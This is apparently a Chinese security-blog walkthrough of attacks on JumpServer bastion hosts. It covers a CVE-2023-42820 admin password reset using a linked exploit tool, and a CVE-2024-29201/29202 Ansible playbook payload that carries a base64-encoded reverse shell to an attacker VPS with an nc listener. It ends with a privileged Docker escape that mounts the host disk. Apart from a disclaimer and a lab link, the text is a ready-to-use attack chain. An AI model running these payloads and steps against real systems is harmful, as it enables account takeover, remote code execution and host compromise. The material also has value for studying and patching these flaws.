> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk0MzYyMjEzMQ==&mid=2247489827&idx=1&sn=264424757492ed5ebf08dc614338f473

#  实操文档分享--续《内网攻防：2025攻防开始前夕，学会如何突破Jumpserver堡垒机》  
AegisGuard  AegisGuard   2025-07-01 01:00  
  
免责声明  
  
合法使用原则：文中提及的技术、工具或案例，仅用于授权范围内的安全测试、防御研究或合规技术分享，未经授权的网络攻击、数据窃取等行为均属违法，需承担法律责任。  
  
风险自担与责任豁免：文章内容基于公开信息整理，不保证技术的准确性、完整性或适用性。读者需自行评估技术应用风险，若因不当使用导致任何法律后果或损失，均由使用者自行承担，与本公众号及作者无关。  
  
法律管辖与提示：本公众号坚决拥护相关法律法规，反对任何危害网络安全的行为，读者需严格遵守法律法规。  
  
实操视频：[《内网攻防：2025攻防开始前夕，学会如何突破Jumpserver堡垒机》](https://mp.weixin.qq.com/s?__biz=Mzk0MzYyMjEzMQ==&mid=2247489766&idx=1&sn=00ea42b7a9e3d0612d29d9a618ca4d67&scene=21#wechat_redirect)  
  
# 一、CVE-2023-42820  
## 漏洞介绍  
- CVE-2023-42820是针对JumpServer堡垒机的一个高危安全漏洞，涉及其密码重置机制中的伪随机数生成器种子泄露问题，攻击者可利用该漏洞，在未登录的情况下，利用API造成随机数种子泄露，进而重放随机生成的验证码，进而实现对任意用户账户密码的重置，最终登录  
  
- 受影响版本：
```
v2.x（版本2.24至2.28.20）和v3.x（版本3.0.0至3.6.4）
```

  
  
- 安全版本：
```
v2 >= v2.28.20或v3 >= v3.7.1
```

  
  
- 靶机下载：  
https://github.com/vulhub/vulhub/tree/master/jumpserver/CVE-2023-42820  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/t88ugf2jgYC031f3rcVGKIUVUYwy8AoIqZjPlpcpXO9ickialibWBsyyicicMicbOo6vLFM2HgPguZBdfXZu3l5NcDtg/640?wx_fmt=other&from=appmsg "")  
## 漏洞利用  
- 工具下载地址：  
https://github.com/Framework-vulnerability-tool/JumpServer  
  
- 使用方法（修改admin用户的密码）  
  

```
python -m pip install -r requirements.txt
python blackjump.py reset https://vulerability
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYC031f3rcVGKIUVUYwy8AoINQyILLnDT4l3dnGH8PBFXVenoial7xBTOjRKsHRiaezgy13I2uDgxMwA/640?wx_fmt=png&from=appmsg "")  
- 使用新密码进行登录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYC031f3rcVGKIUVUYwy8AoIy1JbNcibFVZzKu5eiclG4JibpgIiblU1v6PicN3P5ibgtM1zOfk7W4vXgTXg/640?wx_fmt=png&from=appmsg "")  
# 二、CVE-2024-29201&&CVE-2024-29202  
## 漏洞介绍  
- CVE-2024-29201（远程代码执行漏洞）：由于JumpServer中的Ansible模块未进行完整的输入验证，具有低权限账户的攻击者可以绕过JumpServer的Ansible中的验证机制，在Celery容器中执行任意代码，并从主机中窃取敏感信息或操纵数据库  
  
- CVE-2024-29202（Jinin2 模板注入漏洞）：经过身份验证的攻击者可以通过构建恶意playbook模板，利用Ansible中的Jinja2模板引擎在Celery容器中执行任意代码，并从主机中窃取敏感信息或操纵数据库  
  
- 影响版本：
```
v3.0.0 <= JumpServer <= v3.10.6
```

  
  
## 漏洞利用  
- 通过CVE-2023-42820、信息泄露、弱口令等等方式通过管理员账号后台以后，可以创建一个普通账号  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYC031f3rcVGKIUVUYwy8AoIrTEjzJxzdcgtm73sUjYa2NsiasLVykv5niaicAjt3fyZxcTM7aVNFqdrA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYC031f3rcVGKIUVUYwy8AoIm9Jdfls8FRFofR9GjtkCgumaE7ov051pBibC815kMLRgNp6PLKLZyrg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYC031f3rcVGKIUVUYwy8AoIyxrrMHtgLAKLVK9zbXIA8t9Sqib8hE5MLwb1XwH4ySKtbejSjOW8Aqw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYC031f3rcVGKIUVUYwy8AoI55f7ibp3weBJs2ltTNlOgc7TicKxj2VC0TTCNfibWq34mTvbtmLAk52Mg/640?wx_fmt=png&from=appmsg "")  
- 接着使用新建的普通账号登录堡垒机（有可能会要求更新信息）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYC031f3rcVGKIUVUYwy8AoI6NLlfSf5SgjicnI06WJ8FctPX8CPukSQaFqMe61WssAE0lYkc15LBSw/640?wx_fmt=png&from=appmsg "")  
- 在模板管理处创建一个Playbook  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYC031f3rcVGKIUVUYwy8AoI78ssdppqYiaw1oFaKVBncrlObbVicVu7Tq6ibZBfz1C4X28iaiatb6kQkQA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYC031f3rcVGKIUVUYwy8AoIFEP1IZyALpgRbiaU6lUibtdpEWPpBd7QdI5HyA91uYVe1oHT9zXxJtnw/640?wx_fmt=png&from=appmsg "")  
- 创建完成后，往Playbook管理中添加POC，用于反弹shell到攻击者的VPS  
  

```
[{
     &#34;name&#34;: &#34;RCE playbook&#34;,
     &#34;hosts&#34;: &#34;all&#34;,
     &#34;tasks&#34;: [
       {
         &#34;name&#34;: &#34;this runs in Celery container&#34;,
         &#34;shell&#34;: &#34;echo YmFzaCAtaxxxxxxxxxxxxxxxC80MyxxxxxxxxOTEuMTg4Lzg4ODggMD4mMQ==|base64 -d|bash -i&#34;,
         &#34;\u0064elegate_to&#34;: &#34;localhost&#34;
} ],
     &#34;vars&#34;: {
     &#34;ansible_\u0063onnection&#34;: &#34;local&#34;
     }
}]
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYC031f3rcVGKIUVUYwy8AoI7vdEoALibavTKojGwhUMqicz91eiaicib5WpYutcEja4wJ1Bic9jrPJurRQg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYC031f3rcVGKIUVUYwy8AoIZ5gn1pYqmDTvyUa8tVPzM5ClZpQerLg6Mib28juCGF8I2IWvTNNO3gQ/640?wx_fmt=png&from=appmsg "")  
- 在作业管理处创建一个Playbook作业  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYC031f3rcVGKIUVUYwy8AoIxDx7068b3wwP69D67uIQBhV24iaeCic83VZRnKz6UzwP6hpEvGaPmxHw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYC031f3rcVGKIUVUYwy8AoIJYibsJJjJ6bALGjfCqysj4M2uTEB06icUz0La5lEMtCLgbicnWkt4ZSrg/640?wx_fmt=png&from=appmsg "")  
- 此时在VPS上使用nc进行监听  
  

```
nc -vlnp 8888
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYC031f3rcVGKIUVUYwy8AoI14Vqib48H5NrUQWGDsf9Ytf0Wd7xWB1tt2HNxSnnibRicbX8rgUVlxEicw/640?wx_fmt=png&from=appmsg "")  
- 接着在作业管理中，运行刚刚新建的作业  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYC031f3rcVGKIUVUYwy8AoIpwmk2MTYBOlfS0cNa1A3eUIiaiacO6R0mpVUzIAPQiateaWE9hGa30yiaw/640?wx_fmt=png&from=appmsg "")  
- 反弹shell成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYC031f3rcVGKIUVUYwy8AoIFPftFtb9oeWhUhfJJVu9KNHXTycZjm6QhIsMvsYxuVZyyyVUlt4NpQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYC031f3rcVGKIUVUYwy8AoICZ2uS6VCcNvRYEhtJVLMGz4pP35QU8oOOA1TsqXUd2ZVOmqHBT7LJw/640?wx_fmt=png&from=appmsg "")  
## 三、docker逃逸（特权模式）  
- 有些JumpServer通过docker来部署，所以反弹shell成功以后，就需要判断一下当前是否在docker环境中  
  

```
cat /proc/1/cgroup
ls -al / | grep &#34;docker&#34;
mount | grep '/ type'
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYC031f3rcVGKIUVUYwy8AoIwXMRrgIGvGmucNbUQJzNPZGOoiae6aIVuwglgxicPCBfTia9pu3f5uORA/640?wx_fmt=png&from=appmsg "")  
- 当确定当前是docker环境以后，就需要判断当前是否为特权模式，如果是特权模式启动的话CapEff对应的掩码值应该为
```
0000003fffffffff
```

  
或者是
```
0000001fffffffff
```

  
  

```
cat /proc/self/status | grep CapEff
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYC031f3rcVGKIUVUYwy8AoIs9WEvnOo6JmJ8AmfDWHjJxkZFlHATV8N5IYFBcMkKqAkDibJbhVBd6g/640?wx_fmt=png&from=appmsg "")  
- 查看磁盘分区，查看可以挂载的分区  
  

```
lsblk
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYC031f3rcVGKIUVUYwy8AoIticNQJfunquBPYuMr1Q6lowjDKd0xhcozvIibtgmicbAWziaetfz4Tt2bg/640?wx_fmt=png&from=appmsg "")  
- 特权逃逸，创建目录，并将分区挂载到目录中  
  

```
mkdir /test && mount /dev/sda5 /test
cd /test
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYC031f3rcVGKIUVUYwy8AoIDSXnYqQ0QhmW3gabnz7nZ4BlAEOzlDxChC3KXaeyQdLdzFDNZMKIVA/640?wx_fmt=png&from=appmsg "")  
- 逃逸成功，成功将宿主机内容挂载到test目录下，并且在宿主机上执行命令  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYC031f3rcVGKIUVUYwy8AoIo7arVSPkxCJnF41nbdWibD73KU7DhaV4Vl71UiaDCicrKbMYuBO9AroCw/640?wx_fmt=png&from=appmsg "")  
  
  
